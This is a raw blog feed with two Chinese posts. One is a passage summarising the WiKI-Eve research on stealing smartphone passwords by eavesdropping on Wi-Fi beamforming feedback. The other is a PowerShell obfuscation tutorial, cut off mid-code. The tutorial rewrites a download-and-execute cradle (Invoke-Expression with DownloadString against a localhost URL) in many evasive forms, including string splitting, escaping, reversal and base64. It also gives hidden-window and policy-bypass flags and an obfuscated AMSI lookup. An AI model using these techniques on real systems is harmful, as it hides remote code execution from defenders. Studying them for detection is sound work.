时间序列和频谱图，证实了这些键之间的显着区别：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163222028.png" alt="image-20231018163222028" style="zoom:67%;" /></p><p>&emsp;同时，下图对于 CSI 的四键测试也表明进行 KI 之前需要进行一些重度去噪，因为某些键之间的区别（例如4和“6）似乎被噪音淹没了，因此需要预处理：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163437352.png" alt="image-20231018163437352" style="zoom:67%;" /></p><h2 id="WiKI-Eve的设计"><a href="#WiKI-Eve的设计" class="headerlink" title="WiKI-Eve的设计"></a>WiKI-Eve的设计</h2><p>&emsp;设计流程包括五个步骤：（1）识别受害者；（2）确定受害者访问目标应用服务时的攻击时间；（3）捕获受害者的BFI时间序列；（4）解析和恢复稀疏的 BFI 系列；（5）对 BFI 系列进行分段并执行 KI 来恢复密码。如下所示：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163904402.png" alt="image-20231018163904402" style="zoom:67%;" /> </p><h3 id="步骤1-amp-2"><a href="#步骤1-amp-2" class="headerlink" title="步骤1&amp;2"></a>步骤1&amp;2</h3><p>&emsp;Eve 可以通过流量监控来识别受害者：将各种 MAC 地址的网络流量与用户行为相关联，从而识别 Bob 的 MAC 地址。 <code>受害者识别只能通过 IKI 实现，因为 OKI 的模拟性质禁止使用标头信息来区分多个主体</code>。</p><p>&emsp;一旦锁定了 Bob 的 MAC 地址，Eve 就会当 Bob 即将输入密码时发起攻击。Eve 可以j监视对支付服务提出的请求，对微信而言，Eve 创建了一个与支付服务相关的 IP 地址数据库：<code>虽然此类 IP 地址可以是动态的，但实验表明，来自同一地区的用户在一定时间内会被定向到相同的 IP 地址</code>。</p><h3 id="步骤3-amp-4"><a href="#步骤3-amp-4" class="headerlink" title="步骤3&amp;4"></a>步骤3&amp;4</h3><p>&emsp;首先解释一下 BFI 是如何生成的：BFI 是 CSI $H$ 的发送组件，并被反馈以指导 AP 波束成形。 通过 SVD（奇异值分解），它将 $H$ 分解为 $H=USV$。 在这些组件中，右侧矩阵 $V$ 为 BFI， $U$ 和 $S$ 分别代表接收端波束成形和通道增益。 Bob 的密码输入会影响手机周围 Wi-Fi 信号的衍射。 这种改变反映在下行链路 CSI 中，而下行链路 CSI 用 SVD 分解以获得 BFI 。</p><p>&emsp;由于 BFI 以明文形式传输，Eve 可以使用处于监视模式的 Wi-Fi 设备以及 Wireshark 抓取，遵循 802.11ac 的帧结构，可在<code>VHT 波束成形报告</code>字段中来定位 BFI。为了完全提取 BFI，可以根据 Tx 和 Rx 天线的数量计算场的长度（这是什么意思？）。如果由于时间窗口内控制帧率较低（BFI在控制帧中）而导致 BFI 时间序列过于稀疏，WiKI-Eve 会恢复 BFI 序列。</p><h3 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h3><p>&emsp;我们将详细介绍 WiKI-Eve 如何进行 BFI-KI（击键推断）。首先讨论以前方案的缺点并提出改进。指定 BFI 系列上的信号分割来启动 KI，然后设计 KI 神经模型及其对抗性学习框架，将 KI 泛化。</p><h4 id="现有技术的缺点"><a href="#现有技术的缺点" class="headerlink" title="现有技术的缺点"></a>现有技术的缺点</h4><p>&emsp; WindTalker 通过<code>独立的基于规则的 CSI 分割对各个击键进行分类</code>。这种分割可能导致信息丢失，我们要求两名受试者在各自的智能手机上输入密码，下图显示了他们相应的 CSI 系列。显然，由于受试者不同的打字习惯，虽然基于规则的分割对于打字更稳定的主体 A 可能有效，但对于 B 来说可能失败。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018174224520.png" alt="image-20231018174224520" style="zoom:67%;" /></p><p>&emsp;WINK 通过系列学习（series learning）（应该是一个密码序列）来提高 KI 性能。 然而，它继承了基于规则的分割，因此也有同样的弱点。 此外，由于语言结构不能用于系列学习，WINK 认为击键之间的过渡特征可以作为提高 KI 准确性的替代方法。但是，<code>打字习惯和智能手机类型等因素可能会在过渡期间影响 CSI，从而导致同一密码具有不同的特征</code>，如下所示，可见过渡特征也不靠谱：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018184339999.png" alt="image-20231018184339999" style="zoom:67%;" /></p><p>&emsp;WiKI-Eve 使用由 WindTalker 执行的推断单个击键的规范方法。为了防止分割中的信息丢失，<code>WiKI-Eve 将过渡期视为同一数字击键的不同域</code>。因此，<code>利用对抗性学习来训练 KI 模型，旨在消除域干扰（即环境依赖性），从而将 KI 推广到未见过的场景</code>。请注意，WiKI-Eve 不太可能使用系列学习，如果这样，它需要一个非常大的训练数据集，其大小随着密码长度增长呈指数增长。</p><h4 id="信号分割"><a href="#信号分割" class="headerlink" title="信号分割"></a>信号分割</h4><p>&emsp;BFI 序列可能不会显示连续击键之间的明显边界，从而使信号分割变得非常复杂。下图提供了这种情况的示例，其中 BFI 序列显示了与 Bob 的手指敲击屏幕相对应的突出峰值，以及代表其手指的过渡运动的两个峰值之间的波动。由于过渡期携带先前和后续击键的信息，因此相邻击键的片段应包含该过渡。因此，我们建议采用重叠分割方法，该方法合并位于两个连续峰值之间（从前一个峰值到后续峰值）的所有数据样本。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018225636845.png" alt="image-20231018225636845" style="zoom:67%;" /></p><p>&emsp;分割方法首先利用恒定误报率 (CFAR) 算法来识别 BFI 系列中的峰值。假设 Bob 输入 K 位数字密码，经过稀疏恢复后产生长度为 L 的 BFI 序列，CFAR 算法对该序列进行统计分析，以确定一个自适应阈值，并选择超过该阈值的峰值作为候选人。在这些候选峰中，我们进一步消除了距主峰 W 个采样点距离内的次要峰（主峰如何判断？）。然后，我们在 W 个采样点的峰间距离的辅助下，选择与密码中的 K 个数字相对应的前 K 个峰值，其中$W=\alpha\times\frac{L}{K}$。由于密码中的第一个和最后一个数字没有前后数字，因此我们选择扩展前后的 $N$ 点作为段边界，其中$N=\beta\times\frac{L}{K}$。我们将根据经验确定 $\alpha$ 和 $\beta$ 值。如上图，这种方法有效地将 BFI 系列（密码175249）划分为与各个击键相对应的片段。</p><h4 id="对抗性学习框架"><a href="#对抗性学习框架" class="headerlink" title="对抗性学习框架"></a>对抗性学习框架</h4><p>&emsp;本节解释如何利用对抗性学习将 KI 推广到未见过的领域。时间序列分类可以使用一维 CNN 有效解决。然而，BFI 段的长度可能不同，这对传统的一维 CNN 提出了挑战。为了克服这个问题，采用自适应平均池层（减少参数量）来增强一维 CNN 的灵活性。具体来说，<code>该层自动计算生成固定大小的输出特征图所需的适当内核大小，从而使一维 CNN 能够适应不同长度的输入</code>。</p><p>&emsp;上面的深度学习方法忽略了域对每次击键的影响。域指的是击键前到击键后的转换所产生的上下文，它由打字速度、相邻击键等影响。如下所示，考虑三个不同域中的数字键”1”：”5-1-3”、”6-1-8”和”4-1-2”，并呈现它们相应的特征图，可以发现有极大的不同。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019110518474.png" alt="image-20231019110518474" style="zoom:67%;" /></p><p>&emsp;上述域干扰需要一种确保 KI 对此类干扰不变的方法，因此采用<code>域适应</code>的思想来学习跨不同域不变的击键表示。 WiKI-Eve 利用对抗性学习，将域适应与 KI 集成到统一的训练过程中，从而在不同领域实现一致的特征空间表示。训练过程如下所示：</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019111236393.png" alt="image-20231019111236393" style="zoom:67%;" /></p><p>&emsp;在训练阶段，首先准备随机成对的 BFI 片段组成的数据集，这些片段对应于相同的密钥（例如”1”），但在不同的域下，例如”4-1-2”和”5-1-3”。我们将这对连接起来作为输入 $x$ 并过特征提取器 $G_f$ ，然后输出给到击键分类器 $G_c$ 和域鉴别器 $G_d$ ：$G_c$ 推断出对中两个段相同的键 $y$，$G_d$ 预测域差异 $\Delta\in{0,1}$，其中 0/1 分别表示密钥来自/不来自同一域。虽然 $G_d$ 的目标是提高预测 $\Delta$ 的准确性，但对抗性学习策略通过使用梯度反转层（GRL）来反转损失，从而欺骗 $G_d$；此过程抑制 $G_f$ 输出中的特定于域的特征，从而允许一维 CNN 学习跨域不变的击键表示。</p><p>&emsp;将 $G<em>f$ 、$G_c$ 和 $G_d$ 的参数分别表示为 $\theta</em>{\mathbf{f}}$、$\theta<em>{\mathbf{c}}$ 、$\theta</em>{\mathbf{d}}$，上述训练过程可以表示为：</p><script type="math/tex; mode=display">(\hat{\theta}_{\mathrm{f}},\hat{\theta}_{\mathrm{c}})=\arg\min_{\theta_{\mathrm{f}},\theta_{\mathrm{c}}}\mathcal{L}(y,\Delta,\mathbf{x}),\quad\hat{\theta}_{\mathrm{d}}=\arg\max_{\theta_{\mathrm{d}}}\mathcal{L}(y,\Delta,\mathbf{x})</script><p>&emsp;其中，有$\mathcal{L}(y,\Delta,\boldsymbol{x})=\mathcal{L}<em>{\mathrm{C}}(y,G</em>{\mathrm{C}}(G<em>{\mathrm{f}}(\boldsymbol{x})))-\lambda\mathcal{L}</em>{\mathrm{d}}(\Delta,G<em>{\mathrm{d}}(G</em>{\mathrm{f}}(\boldsymbol{x}))$，$\mathcal{L}<em>{\mathrm{C}}$与$\mathcal{L}</em>{\mathrm{d}}$代表$G_c$与$G_d$的交叉熵损失，$G_d$ 在推理阶段被丢弃，并且通过复制原始 BFI 段（一对片段”4-1-2”与”4-1-2”）来模拟段对 x 的输入。</p><h4 id="恢复稀疏-BFI-时间序列"><a href="#恢复稀疏-BFI-时间序列" class="headerlink" title="恢复稀疏 BFI 时间序列"></a>恢复稀疏 BFI 时间序列</h4><p>&emsp;WiKI-Eve 的另一挑战是流量稀疏性。为了研究稀疏流量如何影响击键丢失和分类准确性，使用 iPerf 生成设备和 AP 之间的数据流量。以 6 位密码为例，我们可以观察到漏击的击键次数几乎随着稀疏度呈线性增加，如下图 (a) 所示。 当流量比例为20%时，最多可能会错过2次按键。 即使对于那些没有遗漏的击键，如下图 (b) 所示，当流量比例下降到 20% 时，对单个数字进行分类的准确率也会从 80% 下降到不到 20%。</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019120941475.png" alt="image-20231019120941475" style="zoom:67%;" /></p><p>&emsp;我们提出了SRA（稀疏恢复算法）。具体而言，我们使用长度为 $\Delta t=1s$ 的滑动窗口来检查是否包含足够的样本，如果滑动窗口内50%的时间段没有BFI，则攻击失败，若大于50%，启动SRA（说明不能太稀疏）。如下图所示，SRA 首先对收集的序列进行重新采样，使其以 $f_s$ 的采样频率均匀分布。随后，该序列被归一化到[0, 1]的范围，没有数据样本的片段被标记为-1。重采样后，我们将 SRA 的输入数据表示为从BFI中提取的一维时间序列 $x_t$，其中 $t$ 是采样时间。 SRA 将输出均匀且密集采样的时间序列 $y_t$。</p><p>&emsp;为了生成缺失样本，SRA 采用基于 AE（自动编码器）网络的 TCN（时间卷积网络，例如LSTM），由编码器和解码器组成，如下图所示。TCN 使用具有扩张内核的卷积层来捕获样本中的远程依赖性，同时保持参数数量的可控性。 TCN-AE 以自我监督的方式进行训练：首先使用饱和流量生成非稀疏 BFI 系列，然后随机删除数据样本以创建稀疏序列，通过遵循真实的时间分布来模拟现实的稀疏性。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping&quot;&gt;&lt;a href=&quot;#WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping&quot; class=&quot;headerlink&quot; title=&quot;WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping&quot;&gt;&lt;/a&gt;WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping&lt;/h1&gt;&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;&amp;emsp;Wi-Fi 的非接触式特性可以泄露隐私，但针对 Wi-Fi CSI（信道状态信息）的攻击需要攻击 Wi-Fi 硬件，这非常困难。为此，我们提出了 WiKI-Eve 技术，无需攻击即可&lt;code&gt;窃听智能手机上的按键操作&lt;/code&gt;。 WiKI-Eve 利用了 Wi-Fi 硬件提供的 BFI（波束成形反馈信息）功能：&lt;code&gt;由于 BFI 以明文形式从智能手机传输到 AP（路由器），因此它可以被切换到监听模式的 Wi-Fi 设备偷听&lt;/code&gt;。WiKI-Eve 还创新了对抗性学习方案，使其推理能够泛化到未见过的场景。结果表明，WiKI-Eve 对单个击键的推理准确率达到 88.9%，对窃取移动应用程序（例如微信）密码的准确率高达 65.8%。&lt;/p&gt;
&lt;p&gt;&amp;emsp;没找到代码呜呜…&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>ps-obfuscation</title>
    <link href="https://wd-2711.tech/2023/10/15/ps-obfuscation/"/>
    <id>https://wd-2711.tech/2023/10/15/ps-obfuscation/</id>
    <published>2023-10-15T02:59:20.000Z</published>
    <updated>2023-10-16T16:17:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="powershell混淆与反混"><a href="#powershell混淆与反混" class="headerlink" title="powershell混淆与反混"></a>powershell混淆与反混</h1><p>&emsp;powershell是基于<code>.net</code>开发的自动化语言。利用ps可以进行很多攻击，例如，利用<code>DownloadString</code>，能够在设备上运行命令/外壳代码/可执行文件，而<code>无需对设备磁盘进行任何写入操作</code>。或者使用<code>Marshall</code>类，外壳代码可以在内存中解密，并且可以在<code>不写入磁盘的情况下执行</code>。ps提供了对机器内核的访问，包括对Windows API的无限制访问。因此，越来越多的网络犯罪分子将PowerShell加入了他们的攻击武器库。</p><span id="more"></span><h2 id="powershell使用的参数"><a href="#powershell使用的参数" class="headerlink" title="powershell使用的参数"></a>powershell使用的参数</h2><h4 id="ExecutionPolicy"><a href="#ExecutionPolicy" class="headerlink" title="ExecutionPolicy"></a>ExecutionPolicy</h4><p>&emsp;为安全目的创建的策略，可确定可以在设备上运行的powershell脚本的类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Restricted：无法在设备上运行脚本</span><br><span class="line">AllSigned：只有由受信任的发布者签名的脚本才能运行</span><br><span class="line">RemoteSigned：只有本地生成的脚本文件才能运行</span><br><span class="line">Unrestricted：可以运行本地创建和签名的脚本，对于远程运行的脚本，将显示命令提示符</span><br><span class="line">Bypass：所有脚本都可以在设备上运行</span><br></pre></td></tr></table></figure><p>&emsp;攻击者假设<code>ExecutionPolicy</code>值是<code>Restricted</code>或<code>RemoteSigned</code>的。此时，攻击者使用<code>powershell -EP bypass</code>或者<code>powershell -ExecutionPolicy bypass</code>来绕过。</p><h4 id="EncodedCommand"><a href="#EncodedCommand" class="headerlink" title="EncodedCommand"></a>EncodedCommand</h4><p>&emsp;Powershell 可以解码并运行 Base64 值，使用<code>powershell -EncodedCommand &#39;Base64 &#39;</code>。</p><h4 id="NonInteractive-NonI"><a href="#NonInteractive-NonI" class="headerlink" title="NonInteractive(NonI)"></a>NonInteractive(NonI)</h4><p>&emsp;执行非交互式脚本。</p><h4 id="NoProfile（NoP）"><a href="#NoProfile（NoP）" class="headerlink" title="NoProfile（NoP）"></a>NoProfile（NoP）</h4><p>&emsp;允许用户在不加载powershell配置文件的情况下运行脚本。powershell配置文件包括：<code>Powershell变量、自定义设置、函数</code>。通过禁用此配置文件，攻击者可以禁用ExecutionPolicy值，因此可以绕过。</p><h4 id="Sta"><a href="#Sta" class="headerlink" title="Sta"></a>Sta</h4><p>&emsp;单线程单元。一些 COM（组件对象模型）对象需要单线程单元模型。COM 对象用于访问系统服务。如果攻击者在其脚本中使用COM对象，可使用此参数来确保脚本能够工作。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>&emsp;因此，常见的ps命令行选项如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -sta -NonI -W Hidden -Enc</span><br></pre></td></tr></table></figure><h2 id="powershell混淆技法（绕过技法）"><a href="#powershell混淆技法（绕过技法）" class="headerlink" title="powershell混淆技法（绕过技法）"></a>powershell混淆技法（绕过技法）</h2><h3 id="去除关键字"><a href="#去除关键字" class="headerlink" title="去除关键字"></a>去除关键字</h3><p>&emsp;去除一些关键字，例如<code>system</code>等，例如：脚本中的<code>New-Object System.Net.WebClient</code> 可以改为<code>New-Object Net.WebClient</code>。</p><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>&emsp;对于脚本中的字符串，例如<code>&quot;http://127.0.0.1/powershell&quot;</code>，可以改为<code>&quot;ht&quot;+&quot;tp://127.0.0.1/powershell&quot;</code>。</p><h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Onlyf8&quot;</span><br></pre></td></tr></table></figure><p>&emsp;可以写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Oxxxaaanaaaabbbxlxxxaaaabbbbyfaaaaxxxxbb8&quot;</span><br><span class="line">$value1.Replace(&quot;x&quot;,&quot;&quot;).Replace(&quot;a&quot;,&quot;&quot;).Replace(&quot;b&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;再比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType((&#x27;System.Management.Automation.AmsiUtils&#x27;));</span><br></pre></td></tr></table></figure><p>&emsp;可以写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType(((&#x27;&#123;4&#125;&#123;0&#125;&#123;9&#125;tem.&#123;3&#125;ana&#123;6&#125;ement.&#123;8&#125;&#123;2&#125;t&#123;7&#125;mati&#123;7&#125;n.&#123;8&#125;m&#123;9&#125;i&#123;5&#125;ti&#123;1&#125;&#123;9&#125;&#x27;)-f&#x27;y&#x27;,&#x27;l&#x27;,&#x27;u&#x27;,&#x27;M&#x27;,&#x27;S&#x27;,&#x27;U&#x27;,&#x27;g&#x27;,&#x27;o&#x27;,&#x27;A&#x27;,&#x27;s&#x27;));</span><br></pre></td></tr></table></figure><h4 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h4><p>&emsp;<code>&quot;hello&quot;</code>可以写成<code>&quot;hELLO&quot;</code>。</p><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><p>&emsp;<code>&quot;hello&quot;</code>可以写成<code>&quot;he   llo&quot;</code>。</p><h4 id="字符串转为命令"><a href="#字符串转为命令" class="headerlink" title="字符串转为命令"></a>字符串转为命令</h4><p>&emsp;<code>&quot;iex&quot;</code>转命令为<code>&amp;(&quot;iex&quot;)</code>。</p><h3 id="使用Invoke方法"><a href="#使用Invoke方法" class="headerlink" title="使用Invoke方法"></a>使用Invoke方法</h3><p>&emsp;对于脚本中的方法调用，可以改为使用Invoke进行调用，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).(&quot;DownloadString&quot;).Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id="使用NewScriptBlock命令"><a href="#使用NewScriptBlock命令" class="headerlink" title="使用NewScriptBlock命令"></a>使用NewScriptBlock命令</h3><p>&emsp;例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.($ExecutionContext.InvokeCommand.NewScriptBlock(&#x27;invoke-expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#x27;))</span><br></pre></td></tr></table></figure><h3 id="使用invoke-command-xxx-（icm）命令"><a href="#使用invoke-command-xxx-（icm）命令" class="headerlink" title="使用invoke-command{xxx}（icm）命令"></a>使用invoke-command{xxx}（icm）命令</h3><p>&emsp;例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-command&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure><p>&emsp;将<code>invoke-command</code>缩写为<code>icm</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icm&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure><h3 id="变量替代"><a href="#变量替代" class="headerlink" title="变量替代"></a>变量替代</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression $test = New-Object System.Net.WebClient</span><br><span class="line">$test.DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id="关键字使用单双引号"><a href="#关键字使用单双引号" class="headerlink" title="关键字使用单双引号"></a>关键字使用单双引号</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;与<code>使用Invoke方法</code>类似，之后都可以接着使用<code>字符串链接</code>进行下一步混淆。</p><p>&emsp;也可以改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object (&quot;System.Net.WebClient&quot;)).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;`htt`p`:`/`/`1`2`7`.`0`.`0`.`1`/`1&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;但是注意，有些字符转义后会影响本身的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`a----警报</span><br><span class="line">`b----退格</span><br><span class="line">`f----换页</span><br><span class="line">`n----换行</span><br><span class="line">`r----回车</span><br><span class="line">`t----水平制表</span><br><span class="line">`v----垂直制表</span><br></pre></td></tr></table></figure><h3 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符*"></a>使用通配符*</h3><p>&emsp;例如New-Object，使用通配符<code>*</code>可写成如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;(Get-Command New-Obje*)</span><br><span class="line">&amp;(Get-Command N*-O*)</span><br><span class="line">&amp;(GCM *w-O*)</span><br><span class="line">&amp;(COMMAND *w-*ct)</span><br></pre></td></tr></table></figure><h3 id="动态变量混淆"><a href="#动态变量混淆" class="headerlink" title="动态变量混淆"></a>动态变量混淆</h3><p>&emsp;例如DownloadString，通过遍历函数并模糊匹配的方式找到此调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为（<code>`$_</code> 表示当前正在处理的对象）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).PsObject.Methods|Where-Object &#123;$_.Name -like &quot;*own*d*ing&quot;&#125;(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure><h3 id="变量传递"><a href="#变量传递" class="headerlink" title="变量传递"></a>变量传递</h3><p>&emsp;写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;set cmd=Write-Host ENV-Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</span><br></pre></td></tr></table></figure><p>&emsp;其中<code>-c</code>代表执行命令后立即终止。之后执行两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd=Write-Host ENV-Fore Green</span><br></pre></td></tr></table></figure><p>&emsp;代表定义cmd为一条ps指令，其为<code>Write-Host ENV-Fore Green</code>，当在ps中输入命令后，命令会赋给cmd。</p><p>&emsp;接着执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX $env:cmd</span><br></pre></td></tr></table></figure><p>&emsp;即运行刚才输入的命令。</p><h3 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$re = &quot;)&#x27;1/1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;</span><br><span class="line">Invoke-Expression ($re[-1..-($re.Length)] -Join &#x27;&#x27;)</span><br></pre></td></tr></table></figure><h3 id="base64编码执行"><a href="#base64编码执行" class="headerlink" title="base64编码执行"></a>base64编码执行</h3><p>&emsp;例如脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$command = &quot;(New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) </span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes) </span><br><span class="line">powershell.exe -EncodedCommand $encodedCommand</span><br></pre></td></tr></table></figure><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>&emsp;使用函数<code>SecureStringToBSTR</code>，若要运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;可以写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = &quot;Invoke-Expression (New-Object 